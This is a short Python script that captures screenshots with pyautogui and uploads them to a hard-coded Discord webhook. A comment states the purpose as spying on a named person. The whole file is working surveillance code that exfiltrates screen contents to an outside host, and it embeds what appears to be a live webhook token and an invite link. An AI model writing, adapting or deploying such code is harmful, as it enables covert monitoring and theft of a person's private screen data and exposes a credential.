from time import sleep
import pyautogui
import keyboard
import requests
import io
import platform


def send_screenshot_to_discord(webhook_url):

    data = {
        'content': (f'img taken from {platform.system()}'),
}
    screenshot = pyautogui.screenshot()
    response = requests.post(webhook_url, json=data)
    if response.status_code == 200:
            print(f"screenshot taken from {platform.system()} was sent successfully")

    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format='PNG')
    screenshot_bytes.seek(0)

    # Post the screenshot to Discord via webhook to spy on murtesa
    files = {
        'file': ('screenshot.png', screenshot_bytes.getvalue()),  
    }

    response = requests.post(webhook_url, files=files)
    print(f'Screenshot sent to Discord with status code: {response.status_code} in https://discord.gg/vmJJnGHtCP.')

def main():
    webhook_url = 'https://discord.com/api/webhooks/1313504327662305352/UCypsxHmLTd42WpH0PlCGyRsd9Gh-xZ9VDBofGmHgyIkSUII_tB-it-IH6ZBFukkoCAI'
    print('Press the "K" key to take a screenshot...')
    data = {
        'content': (f'screenshot taken from {platform.system()}'),
}
    screenshot = pyautogui.screenshot()
    response = requests.post(webhook_url, json=data)
    
    while True:
        keyboard.wait('k')
        send_screenshot_to_discord(webhook_url)
        print(f"screenshot taken from {platform.system()} with status code: {response.status_code}")
        print("wait 15 secs")
        sleep(15)
        print("you can take another screenshot now")


if __name__ == '__main__':
    main()